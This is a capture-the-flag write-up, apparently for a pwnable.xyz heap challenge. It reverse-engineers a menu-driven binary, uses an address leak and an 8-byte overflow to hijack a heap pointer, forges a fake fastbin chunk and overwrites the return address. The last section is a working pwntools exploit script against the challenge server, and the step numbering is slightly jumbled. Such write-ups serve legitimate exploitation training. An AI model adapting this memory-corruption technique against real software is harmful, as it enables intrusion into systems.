## Observation
The program is a simple program that gets user input and does things in the background.
![image](https://github.com/marcorentap/hacking_grimoire/assets/17574533/5b85d1ed-4f44-467c-b84a-aec589aa69cd)

It only accepts integers 1-3. Examining the assembly code confirms this.
![image](https://github.com/marcorentap/hacking_grimoire/assets/17574533/a194b071-0936-44c5-9d4e-b5d2d82a4512)

User input goes through `atoi()` and goes into a kind of switch
- If user input equals 1, do `read()`
- If user input equals 2, do `printf_chk()`,
- If user input equals 3, do `movdqu`

Before getting into the details of what happens on valid inputs, we need to first understand the context

### Setup
![image](https://github.com/marcorentap/hacking_grimoire/assets/17574533/37d9c214-6c0f-4be4-8a48-51a618ea8f25)

In the function prologue, `r12`, `rbp` and `rbx` are pushed, `rsp` is decremented by `0x50` to store our stack variables and stack canary is set up. Note that the usual `push rbp`, `mov rsp, rsp` are not present here and `rbp` is not used as a frame pointer so the stack layout is as follows:
![stack_layout](https://github.com/marcorentap/hacking_grimoire/assets/17574533/0252c0ee-a123-49f6-b901-f80a018137ff)


Before entering the input loop at `0x004007f8`, we have `pHeapChunk = malloc(0x40)`

### Input Loop
![image](https://github.com/marcorentap/hacking_grimoire/assets/17574533/26e0aa77-2282-401d-a55f-09dd7bcdf10d)

At the beginning of the input loop, `arrcInputBuf` is zeroed out then filled with `read(0, &arrcInputBuf, 0x30)` and converted to integer with `atoi(&arrcInputBuf)` and the value is checked:
- If the input is 1, `*pHeapChunk` is filled with `read(0, pHeapChunk, 0x20)`
- If the input is 2, `&pHeapChunk` is printed
- If the input is 3, write double quadword of `*pHeapChunk` to `&vulnVar` with `movdqu`. Intuitively, this is effectively `memcpy(&vulnVar, pHeapChunk, 0x10)`
- If the input is 0, if `pHeapChunk` is `NULL`, then exit with error. Else, do `free(pHeapChunk)` and return

## Exploit
### Vulnerabilities
Option 2 is an (intentional) information leak which allows us to calculate the return address with `&returnAddr = &pHeapChunk + 0x58`. Intuitively,
- `rsp = &pHeapChunk - 0x10`
- `&returnAddr = rsp + 0x68`
- so `&returnAddr = (&pHeapChunk - 0x10) + 0x68`

Option 3 is an 8 byte buffer overflow which will set `pHeapChunk = *(pHeapChunk + 8)`. We can control what is written here with Option 1. Together, we can control where `pHeapChunk` points to and write there whatever we want.

Since the control flow to return must pass through `free(pHeapChunk)`, and to reach it `pHeapChunk` cannot be `NULL`, we must ensure that `pHeapChunk` is a valid pointer to chunk before returning. However, the address of the original heap chunk is not available so a fake chunk must be forged.

![image](https://github.com/marcorentap/hacking_grimoire/assets/17574533/7b3e0b82-744a-405b-8df5-7c8eab3a6e0a)

There are quite a few places we can write to but I chose `0x00601050` to write a 0x40 fastbin chunk.

The address of the win function `&win` is `0x00400a3e`

## Steps
1. Leak `&pHeapChunk` with option 2 and calculate `&returnAddr`
2. Set `*(pHeapChunk + 8) = &returnAddr` with option 1
3. Set `pHeapChunk = (*pHeapChunk + 8)` with option 3. Now `pHeapChunk = &returnAddr`
4. Set `*pHeapChunk = &winAddr` and `*(pHeapChunk + 8) = &fakeChunk - 8` with option 1. Now `returnAddr = &winAddr`

7. Set `pHeapChunk = (*pHeapChunk + 8)` with option 3. Now `pHeapChunk = &fakeChunk - 8`, the fake chunk's size field address
8. Set `*pHeapChunk = 0x40` and `*(pHeapChunk + 8) = &fakeChunk` with option 1. Now the fake chunk's size is set to 0x40
7. Set `pHeapChunk = (*pHeapChunk + 8)` with option 3. Now pheapChunk points to a valid chunk
8. Exit with option 0

### Code
To be consistent with C notation, I use camelCase in python exploits and `varName_addr` means `&varName`. Please bear with the `returnAddr_addr`

```python
from pwn import *

p = remote("svc.pwnable.xyz", 30005)

SA = lambda data : p.sendafter(b">", data)
S = lambda data : p.send(data)

win_addr = 0x00400a3e
fakeChunk_addr = 0x00601050

# Calculate &returnAddr from leaked &pHeapChunk
SA(b"0" * 0x2f + b"2")
pHeapChunk_addr = int(p.recvline(), 16)
returnAddr_addr = pHeapChunk_addr + 0x58
print(f"&pHeapChunk: {pHeapChunk_addr:016x}")
print(f"&returnAddr: {returnAddr_addr:016x}")

SA(b"0" * 0x2f + b"1")
S(p64(0) + p64(returnAddr_addr)) # *(pHeapChunk + 8) = &returnAddr

SA(b"0" * 0x2f + b"3") # pHeapChunk = &returnAddr
SA(b"0" * 0x2f + b"1")
S(p64(win_addr) + p64(fakeChunk_addr - 8)) # *pHeapChunk = &win, *(pHeapChunk + 8) = &fakeChunk - 8

SA(b"0" * 0x2f + b"3") # pHeapChunk = &fakeChunk - 8
SA(b"0" * 0x2f + b"1")
S(p64(0x40) + p64(fakeChunk_addr)) # *pheapChunk = 0x40, *(pHeapChunk + 8) = &fakeChunk

SA(b"0" * 0x2f + b"3") # pHeapChunk = &fakeChunk
SA(b"0" * 0x2f + b"0") # exit :)
```
